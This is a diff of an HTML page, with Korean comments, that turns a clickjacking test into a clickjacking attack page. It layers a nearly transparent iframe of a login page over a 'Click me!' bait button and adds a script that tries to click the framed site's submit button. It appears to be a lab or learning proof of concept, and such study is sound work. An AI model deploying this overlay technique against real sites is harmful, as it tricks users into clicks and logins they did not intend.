@@ -3,11 +3,12 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Clickjacking Test</title>
+    <title>Clickjacking Attack</title>
     <style>
         body {
             margin: 0;
             padding: 0;
+            overflow: hidden;
         }
         iframe {
             position: absolute;
@@ -15,21 +16,50 @@
             left: 0;
             width: 100%;
             height: 100%;
-            opacity: 0.01; /* iframe을 거의 보이지 않게 설정 */
+            opacity: 0.01; /* iframe을 거의 투명하게 설정 */
+            border: none;
             z-index: 2;
+        }
+        .cover {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(255, 255, 255, 0); /* 투명한 덮개 */
+            z-index: 1;
         }
         button {
             position: absolute;
             top: 50%;
             left: 50%;
             transform: translate(-50%, -50%);
-            z-index: 1;
+            z-index: 3;
         }
     </style>
 </head>
 <body>
-    <h1>Click the Button!</h1>
-    <button>Click me!</button>
-    <iframe src="https://example.com/login"></iframe> <!-- 타깃 사이트 URL -->
+    <h1 style="text-align: center;">Click the Button!</h1>
+    <button onclick="triggerLogin()">Click me!</button>
+
+    <iframe src="http://your-domain.com/login.php" id="login-iframe"></iframe>
+
+    <script>
+        function triggerLogin() {
+            const iframe = document.getElementById('login-iframe');
+            try {
+                const iframeDocument = iframe.contentWindow.document;
+                const loginButton = iframeDocument.querySelector('button[type="submit"]');
+                if (loginButton) {
+                    loginButton.click();
+                    console.log("로그인 버튼이 클릭되었습니다.");
+                } else {
+                    console.log("로그인 버튼을 찾을 수 없습니다.");
+                }
+            } catch (error) {
+                console.error("Same-origin policy로 인해 iframe 접근 불가:", error);
+            }
+        }
+    </script>
 </body>
 </html>
